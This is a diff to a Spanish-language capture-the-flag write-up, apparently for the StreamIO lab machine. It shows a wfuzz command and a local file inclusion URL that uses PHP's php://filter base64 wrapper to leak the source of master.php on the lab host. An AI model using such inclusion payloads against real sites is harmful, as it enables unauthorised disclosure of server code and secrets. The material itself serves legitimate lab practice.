@@ -291,7 +291,11 @@ wfuzz -c --hh=1712 --hc=404,403 -u 'https://streamio.htb/admin/?debug=FUZZ.php' 
 
 ### master.php
 utilizando gruappers nuevamente vamos a intentar capturar todo el codigo de este parametro llamado `master.php` en base 64 y luego lo vamos a decodear para poder leer el codigo
-``
+```python
+https://streamio.htb/admin/?debug=php://filter/convert.base64-encode/resource=master.php
+```
+
 ![[Pasted image 20240520162715.png]]
 
+`haremos el proceso inverso reconvi`
 ![[Pasted image 20240520162516.png]]
